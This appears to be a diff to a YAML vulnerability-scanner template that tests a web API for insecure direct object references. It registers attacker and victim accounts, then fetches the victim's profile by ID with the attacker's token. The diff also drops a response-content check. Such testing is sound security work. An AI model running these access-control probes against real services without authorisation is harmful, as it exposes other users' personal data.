@@ -6,39 +6,33 @@ info:
     - idor
     - access-control
 
-variables:
-  attacker_email: "{{ATTACKER_EMAIL}}"
-  attacker_password: "{{ATTACKER_PASSWORD}}"
-  victim_email: "{{VICTIM_EMAIL}}"
-  victim_password: "{{VICTIM_PASSWORD}}"
-
 requests:
-  - name: Attacker login
+  - name: Create attacker user
     method: POST
-    path: /rest/user/login
+    path: /api/Users/
     headers:
       Content-Type: application/json
-    body: '{"email": "{{attacker_email}}", "password": "{{attacker_password}}"}'
+    body: '{"email": "attacker_{{rand_int()}}@test.com", "password": "TestPass123!", "passwordRepeat": "TestPass123!", "securityQuestion": {"question": "Your favorite memory?", "answer": "memory"}}'
     extractors:
       - type: json
         name: attacker_token
         selector: "$.authentication.token"
       - type: json
         name: attacker_user_id
-        selector: "$.user.id"
+        selector: "$.data.id"
 
-  - name: Victim login
+  - name: Create victim user
     method: POST
-    path: /rest/user/login
+    path: /api/Users/
     headers:
       Content-Type: application/json
-    body: '{"email": "{{victim_email}}", "password": "{{victim_password}}"}'
+    body: '{"email": "victim_{{rand_int()}}@test.com", "password": "TestPass123!", "passwordRepeat": "TestPass123!", "securityQuestion": {"question": "Your favorite memory?", "answer": "memory"}}'
     extractors:
       - type: json
         name: victim_user_id
-        selector: "$.user.id"
+        selector: "$.data.id"
 
-  - name: Try sequential user ID
+  - name: Try to access victim user profile
     method: GET
     path: /api/Users/{{victim_user_id}}
     headers:
@@ -46,9 +40,6 @@ requests:
     matchers:
       - type: status
         values: [200]
-      - type: word
-        words: ["email", "password", "securityQuestion"]
-        condition: or
     on_match:
       vulnerability: INSECURE_DIRECT_OBJECT_REFERENCE
       message: Can access other user profiles by ID
